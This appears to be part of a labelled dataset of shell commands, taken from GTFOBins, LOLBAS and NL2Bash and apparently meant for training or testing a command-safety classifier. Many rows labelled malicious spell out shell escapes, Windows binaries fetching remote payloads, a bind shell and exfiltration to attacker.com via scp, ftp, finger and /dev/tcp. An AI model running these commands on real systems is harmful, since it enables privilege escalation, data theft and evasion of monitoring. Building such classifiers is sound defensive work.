+{"command": "nano\n^R^X\nreset; sh 1>&0 2>&0", "label": "malicious", "source": "gtfobins", "detail": "nano", "id": 664}
+{"command": "Excel.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Excel.exe", "id": 665}
+{"command": "kill -9 $(lsof -t -i:3000)", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 666}
+{"command": "ansible-test shell", "label": "malicious", "source": "gtfobins", "detail": "ansible-test", "id": 667}
+{"command": "find / -type f -name *.zip -size +100M -exec rm -i {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 668}
+{"command": "nc -l -p 79 </path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "finger", "id": 669}
+{"command": "nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'", "label": "malicious", "source": "gtfobins", "detail": "nohup", "id": 670}
+{"command": "find . -type f -wholename \\*.mbox", "label": "benign", "source": "nl2bash", "detail": null, "id": 671}
+{"command": "finger DATA@attacker.com", "label": "malicious", "source": "gtfobins", "detail": "finger", "id": 672}
+{"command": "find . -type f -printf \"%C@ %p\\n\" | sort -r | head -n 10", "label": "benign", "source": "nl2bash", "detail": null, "id": 673}
+{"command": "nano /path/to/output-file\nDATA\n^O", "label": "malicious", "source": "gtfobins", "detail": "pico", "id": 674}
+{"command": "strace -s 999 -o /path/to/output-file strace - DATA", "label": "malicious", "source": "gtfobins", "detail": "strace", "id": 675}
+{"command": "ed\n!/bin/sh\nq", "label": "malicious", "source": "gtfobins", "detail": "red", "id": 676}
+{"command": "find . -name \\*.c -exec grep hogehoge {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 677}
+{"command": "gzip -dc /file/address/file.tar.gz", "label": "benign", "source": "nl2bash", "detail": null, "id": 678}
+{"command": "echo \"$b\" | grep --only-matching \"[$a]\" | xargs | tr --delete ' '", "label": "benign", "source": "nl2bash", "detail": null, "id": 679}
+{"command": "source <(curl -s http://mywebsite.com/myscript.txt)", "label": "benign", "source": "nl2bash", "detail": null, "id": 680}
+{"command": "logrotate /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "logrotate", "id": 681}
+{"command": "rsync -e '/bin/sh -p -c \"/bin/sh -p 0<&2 1>&2\"' x:x", "label": "malicious", "source": "gtfobins", "detail": "rsync", "id": 682}
+{"command": "find $HOME -mtime +365", "label": "benign", "source": "nl2bash", "detail": null, "id": 683}
+{"command": "find . -exec echo ' List of files & Direcoty'   {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 684}
+{"command": "find . -name \"*.txt\" -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 685}
+{"command": "find . -exec grep foo {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 686}
+{"command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"", "label": "malicious", "source": "lolbas", "detail": "dsdbutil.exe", "id": 687}
+{"command": "find /usr/include -type f -mtime -400 -name \"*.h\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 688}
+{"command": "chgrp -R $GROUP $PATH_TO_OUTPUT_FOLDER", "label": "benign", "source": "nl2bash", "detail": null, "id": 689}
+{"command": "echo 'BEGIN {system(\"/bin/sh 1<&0\");exit()}' >/path/to/temp-file\nbpftrace --unsafe /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "bpftrace", "id": 690}
+{"command": "find . -printf \"%P\\n\" | sort | while IFS= read -r f; do echo \"$(uuid) $f\"; done", "label": "benign", "source": "nl2bash", "detail": null, "id": 691}
+{"command": "find . -size 0 -exec rm {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 692}
+{"command": "Visio.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Visio.exe", "id": 693}
+{"command": "ls -l | tail -n +2 | head -n1", "label": "benign", "source": "nl2bash", "detail": null, "id": 694}
+{"command": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file\nansible-playbook /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "ansible-playbook", "id": 695}
+{"command": "diff <(ls /bin) <(ls /usr/bin)", "label": "benign", "source": "nl2bash", "detail": null, "id": 696}
+{"command": "flock -u / /bin/sh -p", "label": "malicious", "source": "gtfobins", "detail": "flock", "id": 697}
+{"command": "su - jenkins", "label": "benign", "source": "nl2bash", "detail": null, "id": 698}
+{"command": "number=$(echo $filename | tr -cd '[[:digit:]]')", "label": "benign", "source": "nl2bash", "detail": null, "id": 699}
+{"command": "snap install xxxx_1.0_all.snap --dangerous --devmode", "label": "malicious", "source": "gtfobins", "detail": "snap", "id": 700}
+{"command": "soelim /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "soelim", "id": 701}
+{"command": "nc victim.com 12345", "label": "malicious", "source": "gtfobins", "detail": "nawk", "id": 702}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 703}
+{"command": "find / -path /proc -prune -o -user <account> -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 704}
+{"command": "find /tmp -size 0 -atime +10 -exec rm -f {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 705}
+{"command": "find . -iname a\\*.html", "label": "benign", "source": "nl2bash", "detail": null, "id": 706}
+{"command": "pytest -x --maxfail=1", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 707}
+{"command": "diff -y -W 150 file1.cf file2.cf", "label": "benign", "source": "nl2bash", "detail": null, "id": 708}
+{"command": "cp /bin/sh /path/to/temp-dir/\nrun-parts /path/to/temp-dir/ --arg='-p'", "label": "malicious", "source": "gtfobins", "detail": "run-parts", "id": 709}
+{"command": "find /path/ -type f -daystart -mtime +0", "label": "benign", "source": "nl2bash", "detail": null, "id": 710}
+{"command": "diff <(find . -exec readlink -f {} \\; | sed 's/\\(.*\\)\\/.*$/\\1/' | sort | uniq) <(find . -name main.cpp  -exec readlink -f {} \\; | sed 's/\\(.*\\)\\/.*$/\\1/' | sort | uniq) | sed -n 's/< \\(.*\\)/\\1/p'", "label": "benign", "source": "nl2bash", "detail": null, "id": 711}
+{"command": "make || exit $?", "label": "benign", "source": "nl2bash", "detail": null, "id": 712}
+{"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")", "label": "malicious", "source": "lolbas", "detail": "Rundll32.exe", "id": 713}
+{"command": "find . -type f -exec ls -al {} \\; | sort -nr -k5 | head -n 25", "label": "benign", "source": "nl2bash", "detail": null, "id": 714}
+{"command": "find -print0 | tr \"\\0\" \":\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 715}
+{"command": "echo -e 'x\\nx' | passwd", "label": "malicious", "source": "gtfobins", "detail": "passwd", "id": 716}
+{"command": "echo \"$url\" | cut -d'/' -f1-3", "label": "benign", "source": "nl2bash", "detail": null, "id": 717}
+{"command": "watch -n 1 'ps aux | grep php'", "label": "benign", "source": "nl2bash", "detail": null, "id": 718}
+{"command": "bash.exe -c \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "Bash.exe", "id": 719}
+{"command": "apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'", "label": "malicious", "source": "gtfobins", "detail": "apache2", "id": 720}
+{"command": "env /bin/sh -p", "label": "malicious", "source": "gtfobins", "detail": "env", "id": 721}
+{"command": "find /usr/src -name CVS -prune -o -mindepth 7 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 722}
+{"command": "find . -name \"*.pdf\" -maxdepth 1 -print0 | xargs -0 rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 723}
+{"command": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nyarn --cwd .", "label": "malicious", "source": "gtfobins", "detail": "yarn", "id": 724}
+{"command": "cmd.exe - < {PATH}:payload.bat", "label": "malicious", "source": "lolbas", "detail": "Cmd.exe", "id": 725}
+{"command": "diff  --brief --recursive dir1/ dir2/", "label": "benign", "source": "nl2bash", "detail": null, "id": 726}
+{"command": "bee eval '...'", "label": "malicious", "source": "gtfobins", "detail": "bee", "id": 727}
+{"command": "mkdir -p a/b/c", "label": "benign", "source": "nl2bash", "detail": null, "id": 728}
+{"command": "nl -bn -w1 -s '' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nl", "id": 729}
+{"command": "echo /path/to/input-file | cpio -R $UID -dp .\ncat path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "cpio", "id": 730}
+{"command": "find . type -f -mtime -2", "label": "benign", "source": "nl2bash", "detail": null, "id": 731}
+{"command": "xmore /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "xmore", "id": 732}
+{"command": "yelp man:/path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "yelp", "id": 733}
+{"command": "tmux -f /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "tmux", "id": 734}
+{"command": "find . -name .svn -exec rm -rf {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 735}
+{"command": "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o", "label": "malicious", "source": "lolbas", "detail": "Esentutl.exe", "id": 736}
+{"command": "mkdir -p es/LC_MESSAGES", "label": "benign", "source": "nl2bash", "detail": null, "id": 737}
+{"command": "control.exe {PATH_ABSOLUTE:.cpl}", "label": "malicious", "source": "lolbas", "detail": "Control.exe", "id": 738}
+{"command": "find ~/ -name 'core*' -exec rm {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 739}
+{"command": "find -maxdepth 1 -type d | while read dir; do echo $dir; echo cmd2; done", "label": "benign", "source": "nl2bash", "detail": null, "id": 740}
+{"command": "odbcad32.exe", "label": "malicious", "source": "lolbas", "detail": "odbcad32.exe", "id": 741}
+{"command": "echo \"$string\" | sed -e 's/^[ \\t]*//' | sed -e 's/[ \\t]*$//'", "label": "benign", "source": "nl2bash", "detail": null, "id": 742}
+{"command": "msbuild.exe {PATH:.proj}", "label": "malicious", "source": "lolbas", "detail": "Msbuild.exe", "id": 743}
+{"command": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Ieadvpack.dll", "id": 744}
+{"command": "find . -type f -wholename \\*.mbox | sed 's/\\(.*\\)\\.mbox/mv \"\\1.mbox\" \"\\1\"/' | sh", "label": "benign", "source": "nl2bash", "detail": null, "id": 745}
+{"command": "lftp -c '!/bin/sh'", "label": "malicious", "source": "gtfobins", "detail": "lftp", "id": 746}
+{"command": "find . -type f -exec ls -s {} \\; | sort -n  | head -5", "label": "benign", "source": "nl2bash", "detail": null, "id": 747}
+{"command": "dmesg -rF /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "dmesg", "id": 748}
+{"command": "agetty -l /bin/sh -o -p -a root tty", "label": "malicious", "source": "gtfobins", "detail": "agetty", "id": 749}
+{"command": "scp /path/to/input-file user@attacker.com:/path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "scp", "id": 750}
+{"command": "find -type f -name *ummy", "label": "benign", "source": "nl2bash", "detail": null, "id": 751}
+{"command": "logger.exe \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "Logger.exe", "id": 752}
+{"command": "find . -perm -220", "label": "benign", "source": "nl2bash", "detail": null, "id": 753}
+{"command": "ip netns add foo\nip netns exec foo /bin/sh -p\nip netns delete foo", "label": "malicious", "source": "gtfobins", "detail": "ip", "id": 754}
+{"command": "find /path/to/drive -type f -exec file -b '{}' \\; -printf '%s\\n' | awk -F , 'NR%2 {i=$1} NR%2==0 {a[i]+=$1} END {for (i in a) printf(\"%12u %s\\n\",a[i],i)}' | sort -nr", "label": "benign", "source": "nl2bash", "detail": null, "id": 755}
+{"command": "git push --force origin feature/my-branch", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 756}
+{"command": "sudo chown -R xxx /Users/xxx/Library/Developer/Xcode/Templates", "label": "benign", "source": "nl2bash", "detail": null, "id": 757}
+{"command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt", "label": "malicious", "source": "lolbas", "detail": "Bginfo.exe", "id": 758}
+{"command": "uuencode <(head -c 200 /dev/urandom | base64 | gzip)", "label": "benign", "source": "nl2bash", "detail": null, "id": 759}
+{"command": "dialog --textbox /path/to/input-file 0 0", "label": "malicious", "source": "gtfobins", "detail": "dialog", "id": 760}
+{"command": "find /fss/fin -type d", "label": "benign", "source": "nl2bash", "detail": null, "id": 761}
+{"command": "which find", "label": "benign", "source": "nl2bash", "detail": null, "id": 762}
+{"command": "expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}", "label": "malicious", "source": "lolbas", "detail": "Expand.exe", "id": 763}
+{"command": "find . -type f -name \\*.ext | xargs grep foo", "label": "benign", "source": "nl2bash", "detail": null, "id": 764}
+{"command": "yarn upgrade-interactive --latest", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 765}
+{"command": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:{REMOTEURL:.sct}\"\")\"))", "label": "malicious", "source": "lolbas", "detail": "Mshta.exe", "id": 766}
+{"command": "tar -xf {PATH_SMB:.tar}", "label": "malicious", "source": "lolbas", "detail": "Tar.exe", "id": 767}
+{"command": "AppVLP.exe {PATH_SMB:.bat}", "label": "malicious", "source": "lolbas", "detail": "Appvlp.exe", "id": 768}
+{"command": "msoxmled.exe /verb open {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "msoxmled.exe", "id": 769}
+{"command": "name=\"$(date +'%d%m%Y-%H-%M')_$(whoami)\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 770}
+{"command": "find . -type f \\( -iname \"*.c\" -or -iname \"*.asm\" \\)", "label": "benign", "source": "nl2bash", "detail": null, "id": 771}
+{"command": "find . -nouser | xargs rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 772}
+{"command": "find . -name *.txt | egrep mystring", "label": "benign", "source": "nl2bash", "detail": null, "id": 773}
+{"command": "zsh -c '</etc/hosts'", "label": "malicious", "source": "gtfobins", "detail": "zsh", "id": 774}
+{"command": "find . -name \".txt\" -exec rm \"{}\" \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 775}
+{"command": "look '' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "look", "id": 776}
+{"command": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}", "label": "malicious", "source": "lolbas", "detail": "Pubprn.vbs", "id": 777}
+{"command": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}", "label": "malicious", "source": "lolbas", "detail": "Shimgvw.dll", "id": 778}
+{"command": "rpmverify --eval '%{lua:...}'", "label": "malicious", "source": "gtfobins", "detail": "rpmverify", "id": 779}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "ruby", "id": 780}
+{"command": "find . -cpio /dev/fd0 -print | tee /tmp/BACKUP.LOG", "label": "benign", "source": "nl2bash", "detail": null, "id": 781}
+{"command": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}", "label": "malicious", "source": "lolbas", "detail": "Sc.exe", "id": 782}
+{"command": "rpm2cpio php-5.1.4-1.esp1.x86_64.rpm | cpio -idmv", "label": "benign", "source": "nl2bash", "detail": null, "id": 783}
+{"command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}", "label": "malicious", "source": "lolbas", "detail": "Dnscmd.exe", "id": 784}
+{"command": "find . -perm /222", "label": "benign", "source": "nl2bash", "detail": null, "id": 785}
+{"command": "tttracer.exe {PATH_ABSOLUTE:.exe}", "label": "malicious", "source": "lolbas", "detail": "Tttracer.exe", "id": 786}
+{"command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}", "label": "malicious", "source": "lolbas", "detail": "Launch-VsDevShell.ps1", "id": 787}
+{"command": "find -L . -type f -perm -u=x,g=x  \\! -perm -o=x", "label": "benign", "source": "nl2bash", "detail": null, "id": 788}
+{"command": "scanmem\nshell /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "scanmem", "id": 789}
+{"command": "find a -type f -name '4' -delete -printf \"%h\\0\" | xargs -0 -r rmdir", "label": "benign", "source": "nl2bash", "detail": null, "id": 790}
+{"command": "find . -type d", "label": "benign", "source": "nl2bash", "detail": null, "id": 791}
+{"command": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}", "label": "malicious", "source": "lolbas", "detail": "PrintBrm.exe", "id": 792}
+{"command": "mount -o ro,remount -t yaffs2 /dev/block/mtdblk4 /system", "label": "benign", "source": "nl2bash", "detail": null, "id": 793}
+{"command": "find -name \"filename\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 794}
+{"command": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab", "label": "malicious", "source": "lolbas", "detail": "Makecab.exe", "id": 795}
+{"command": "WFMFormat.exe", "label": "malicious", "source": "lolbas", "detail": "WFMFormat.exe", "id": 796}
+{"command": "tail -c+0 /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "tail", "id": 797}
+{"command": "ssh localhost \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "ssh.exe", "id": 798}
+{"command": "rcsi.exe {PATH:.csx}", "label": "malicious", "source": "lolbas", "detail": "rcsi.exe", "id": 799}
+{"command": "od -xcb input_file_name | less", "label": "benign", "source": "nl2bash", "detail": null, "id": 800}
+{"command": "find / -name '*python*'", "label": "benign", "source": "nl2bash", "detail": null, "id": 801}
+{"command": "find /etc -print0 | grep -azZ test | xargs -0 file", "label": "benign", "source": "nl2bash", "detail": null, "id": 802}
+{"command": "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 803}
+{"command": "find / \\( -name 10_Recommended* -o -name share \\) -prune -o -type f -name java -print 2>/dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 804}
+{"command": "find /tmp/test/* -mtime +1", "label": "benign", "source": "nl2bash", "detail": null, "id": 805}
+{"command": "MsoHtmEd.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "MsoHtmEd.exe", "id": 806}
+{"command": "fmt -pNON_EXISTING_PREFIX /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "fmt", "id": 807}
+{"command": "find . -type f -name \"*.java\" -exec perl -p -i -e \"s/[ \\t]$//g\" {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 808}
+{"command": "neofetch --ascii /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "neofetch", "id": 809}
+{"command": "find <dir> -mtime +7", "label": "benign", "source": "nl2bash", "detail": null, "id": 810}
+{"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{PATH_ABSOLUTE}:evil.exe\"", "label": "malicious", "source": "lolbas", "detail": "Forfiles.exe", "id": 811}
+{"command": "sudo chmod 777 .git/hooks/prepare-commit-msg", "label": "benign", "source": "nl2bash", "detail": null, "id": 812}
+{"command": "df $path_in_question | grep \" $path_in_question$\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 813}
+{"command": "find . -name \"*.pdf\" -exec rm {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 814}
+{"command": "yes 0 | sed '1~2s/0/1/'", "label": "benign", "source": "nl2bash", "detail": null, "id": 815}
+{"command": "mkdir -p ./etc/\ngrep -oP \"^CHROOT_VERSION='\\K[^']+\" /usr/share/devtools/lib/archroot.sh >.arch-chroot\ntouch ./etc/pacman.conf\necho 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf\narch-nspawn .", "label": "malicious", "source": "gtfobins", "detail": "arch-nspawn", "id": 816}
+{"command": "echo '#!/bin/sh -p' >/path/to/temp-file\necho 'exec /bin/sh -p 0<&1' >>/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "gtester", "id": 817}
+{"command": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}", "label": "malicious", "source": "lolbas", "detail": "Print.exe", "id": 818}
+{"command": "alias | grep xlogs", "label": "benign", "source": "nl2bash", "detail": null, "id": 819}
+{"command": "ngen.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Ngen.exe", "id": 820}
+{"command": "split", "label": "benign", "source": "nl2bash", "detail": null, "id": 821}
+{"command": "tar cf /dev/stdout /path/to/input-file -I 'tar xO'", "label": "malicious", "source": "gtfobins", "detail": "tar", "id": 822}
+{"command": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}", "label": "malicious", "source": "lolbas", "detail": "Cmstp.exe", "id": 823}
+{"command": "mail --exec='!/bin/sh'", "label": "malicious", "source": "gtfobins", "detail": "mail", "id": 824}
+{"command": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}", "label": "malicious", "source": "lolbas", "detail": "Odbcconf.exe", "id": 825}
+{"command": "find / -name composer.json", "label": "benign", "source": "nl2bash", "detail": null, "id": 826}
+{"command": "RESTIC_PASSWORD_COMMAND='/bin/sh -p -c \"/bin/sh -p 0<&2 1<&2\"' restic backup", "label": "malicious", "source": "gtfobins", "detail": "restic", "id": 827}
+{"command": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}", "label": "malicious", "source": "lolbas", "detail": "Desk.cpl", "id": 828}
+{"command": "history | more", "label": "benign", "source": "nl2bash", "detail": null, "id": 829}
+{"command": "find ./ -maxdepth 1 -name \"some-dir\" -type d -print0 | xargs -0r mv -t x/", "label": "benign", "source": "nl2bash", "detail": null, "id": 830}
+{"command": "find . -name '*.php' -exec chmod 755 {} \\; -exec echo '+' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 831}
+{"command": "screen -L -Logfile /path/to/output-file echo DATA", "label": "malicious", "source": "gtfobins", "detail": "screen", "id": 832}
+{"command": "./script.sh | sort -u", "label": "benign", "source": "nl2bash", "detail": null, "id": 833}
+{"command": "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}", "label": "malicious", "source": "lolbas", "detail": "Shell32.dll", "id": 834}
+{"command": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt", "label": "malicious", "source": "lolbas", "detail": "Ftp.exe", "id": 835}
+{"command": "nc -l -p 80 | awk 'BEGIN {RS=\"\\r\\n\\r\\n\";ORS=\"\"} NR==2' >/path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "perl", "id": 836}
+{"command": "find . -name \u201c*.[php|PHP]\u201d -print | xargs grep -HnT \u201cspecified string\u201d", "label": "benign", "source": "nl2bash", "detail": null, "id": 837}
+{"command": "find . -name \"*.txt\" -print0 | xargs -0 python hello.py", "label": "benign", "source": "nl2bash", "detail": null, "id": 838}
+{"command": "find /u/netinst -print | xargs chown netinst", "label": "benign", "source": "nl2bash", "detail": null, "id": 839}
+{"command": "fsi.exe", "label": "malicious", "source": "lolbas", "detail": "Fsi.exe", "id": 840}
+{"command": "sed -e '{:q;N;s/\\n/ /g;t q}' file", "label": "benign", "source": "nl2bash", "detail": null, "id": 841}
+{"command": "sqlite3 <<EOF\nCREATE TABLE x(x TEXT);\n.import /path/to/input-file x\nSELECT * FROM x;\nEOF", "label": "malicious", "source": "gtfobins", "detail": "sqlite3", "id": 842}
+{"command": "find . -name \"*.gz\" -execdir gunzip '{}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 843}
+{"command": "gcc @/path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "cc", "id": 844}
+{"command": "ssh \"$USER@$SERVER\" \"$cmd_str\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 845}
+{"command": "find / -type f -print | xargs grep \"device\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 846}
+{"command": "crontab -e", "label": "malicious", "source": "gtfobins", "detail": "crontab", "id": 847}
+{"command": "find . -name 'cmn-*\\.flac' -print | grep -P './cmn-[\\x4e00-\\x9fa5]\\.flac'", "label": "benign", "source": "nl2bash", "detail": null, "id": 848}
+{"command": "cat >/path/to/temp-file.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/path/to/command'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /path/to/temp-file.xml\nvirsh -c qemu:///system destroy x", "label": "malicious", "source": "gtfobins", "detail": "virsh", "id": 849}
+{"command": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "apt", "id": 850}
+{"command": "rpmdb --eval '%(/bin/sh 1>&2)'", "label": "malicious", "source": "gtfobins", "detail": "rpmdb", "id": 851}
+{"command": "setfacl -m u:$(id -un):rwx /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "setfacl", "id": 852}
+{"command": "history \"$@\" | tac | nl | tac", "label": "benign", "source": "nl2bash", "detail": null, "id": 853}
+{"command": "cal -3 12 2120", "label": "benign", "source": "nl2bash", "detail": null, "id": 854}
+{"command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 855}
+{"command": "rav=$(echo $var | rev)", "label": "benign", "source": "nl2bash", "detail": null, "id": 856}
+{"command": "ftp -a attacker.com\nput /path/to/input-file output-file", "label": "malicious", "source": "gtfobins", "detail": "ftp", "id": 857}
+{"command": "Update.exe --download {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 858}
+{"command": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n \"$(<&$REPLY)\" >/path/to/output-file'", "label": "malicious", "source": "gtfobins", "detail": "zsh", "id": 859}
+{"command": "find . -type f -print | xargs grep -il '^Subject:.*unique subject'", "label": "benign", "source": "nl2bash", "detail": null, "id": 860}
+{"command": "regsvr32.exe /s {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Regsvr32.exe", "id": 861}
+{"command": "yes | cp -rf /zzz/zzz/* /xxx/xxx", "label": "benign", "source": "nl2bash", "detail": null, "id": 862}
+{"command": "fltMC.exe unload SysmonDrv", "label": "malicious", "source": "lolbas", "detail": "fltMC.exe", "id": 863}
+{"command": "find -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 864}
+{"command": "find . -name *conf* -exec grep -Hni 'matching_text' {} \\; > matching_text.conf.list", "label": "benign", "source": "nl2bash", "detail": null, "id": 865}
+{"command": "rpmverify --eval '%(/bin/sh 1>&2)'", "label": "malicious", "source": "gtfobins", "detail": "rpmverify", "id": 866}
+{"command": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta", "label": "malicious", "source": "lolbas", "detail": "Url.dll", "id": 867}
+{"command": "find /etc -newer /tmp/foo", "label": "benign", "source": "nl2bash", "detail": null, "id": 868}
+{"command": "tcsh", "label": "malicious", "source": "gtfobins", "detail": "tcsh", "id": 869}
+{"command": "find . -type l | while read f; do /bin/cp -rf --remove-destination -f $(find . -name $(readlink \"${f}\")) \"${f}\";done;", "label": "benign", "source": "nl2bash", "detail": null, "id": 870}
+{"command": "find /path/to/files -type f -name \\*.cfg  -print -exec cat {} \\; -exec sleep 2 \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 871}
+{"command": "csc -target:library {PATH:.cs}", "label": "malicious", "source": "lolbas", "detail": "Csc.exe", "id": 872}
+{"command": "find / -maxdepth 1 -xdev -type f -exec grep -Zli \"stringtofind\" {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 873}
+{"command": "basenc --base64 /path/to/input-file | basenc -d --base64", "label": "malicious", "source": "gtfobins", "detail": "basenc", "id": 874}
+{"command": "npm publish --access public", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 875}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "tclsh", "id": 876}
+{"command": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}", "label": "malicious", "source": "lolbas", "detail": "Xwizard.exe", "id": 877}
+{"command": "find -type f -exec grep -Hn \"texthere\" {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 878}
+{"command": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl", "label": "malicious", "source": "gtfobins", "detail": "apt-get", "id": 879}
+{"command": "echo DATA | cp /dev/stdin /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "cp", "id": 880}
+{"command": "cat *.txt | tail -n +1001 | split --lines=1000", "label": "benign", "source": "nl2bash", "detail": null, "id": 881}
+{"command": "find . -maxdepth 0 -type f -exec chmod g+w {} ';'", "label": "benign", "source": "nl2bash", "detail": null, "id": 882}
+{"command": "find / -newer ttt -user wnj -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 883}
